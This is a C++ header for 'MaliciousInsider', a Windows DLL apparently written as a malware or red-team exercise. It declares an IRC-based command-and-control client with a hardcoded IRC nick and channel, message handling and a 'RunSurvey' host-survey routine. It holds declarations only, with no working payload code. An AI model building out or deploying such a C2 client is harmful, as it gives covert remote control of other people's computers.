/* MaliciousInsider.h

Brian Seel

2015/04/15

*/

#include <exception>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <ShlObj.h>
#include <fstream>
#include <boost/algorithm/string.hpp>

using namespace std;
using namespace boost;

#ifdef MALICIOUSINSIDER_EXPORTS
#define MALICIOUSINSIDER_API __declspec(dllexport)
#else
#define MALICIOUSINSIDER_API __DECLSPEC(dllimport)
#endif

//Defines
#define IRCUSER		"cylussec"
#define IRCROOM		"#cylussec"
#define MAXDATASIZE 412
#define MAXPATH		512
#define MAXDATA		1024

int debug_printf(const char *fmt, ...);
#ifdef _DEBUG
#define DEBUGF debug_printf x
#else
#define DEBUGF
#endif

/** MaliciousInsider Client
*  IRC Client accepting command and control commands from an IRC server
*/

class MaliciousInsider
{
public:
	MaliciousInsider();
	~MaliciousInsider();

	enum MISTATUS{
		MISTATUS_SUCCESS		= 1,
		MISTATUS_ARGUMENTERROR	= 2,
		MISTATUS_SOCKETERROR	= 3,
		MISTATUS_SENDERROR		= 4,
		MISTATUS_PINGERROR		= 5,
		MISTATUS_SURVEYERROR	= 6
	};

	MISTATUS Start();
	MISTATUS SendData(string SendBuf);
	MISTATUS SendPong(string RecvBuf);
	MISTATUS ProcessMessage(string RecvBuf);
	MISTATUS RunSurvey();

private:
	SOCKET ClientSocket;
	string nick_cmd;
	string user_cmd;
	sockaddr_in clientService;
	bool Connected;
	bool SurveyCompleted;
};